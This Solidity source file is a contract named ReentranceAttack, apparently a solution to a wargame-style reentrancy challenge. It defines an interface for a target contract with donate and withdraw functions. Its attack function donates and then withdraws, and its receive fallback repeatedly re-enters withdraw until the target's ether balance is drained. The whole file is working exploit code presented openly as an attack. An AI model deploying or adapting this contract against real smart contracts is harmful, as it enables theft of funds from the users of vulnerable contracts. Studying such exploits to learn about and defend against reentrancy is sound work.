// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

//Methods that should be defined on the attacked contract
interface ReentranceInterface {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

/*
    * Contract which is used to attack Reentrancy
*/
contract ReentranceAttack {

    address target_contract;
    uint amount;

    /*
        * Initiates the attack against the given contract by withdrawing
        * the amount that was donated.
    */
    function attack(address _contract) public payable {
        target_contract = _contract;
        amount = msg.value;
        ReentranceInterface(_contract).donate{value: amount}(address(this));
        ReentranceInterface(_contract).withdraw(amount);
    }

    /*
        * This is called when Reentrancy sends eth to this contract
        * Create a loop that will continue to withdraw funds from the target_contract,
        * using the amount that was donated, until there's nothing left. 
    */
    receive() external payable {
        if(target_contract.balance > amount) {
            ReentranceInterface(target_contract).withdraw(amount);
        } else if(target_contract.balance > 0) {
            ReentranceInterface(target_contract).withdraw(target_contract.balance);
        }
    }
}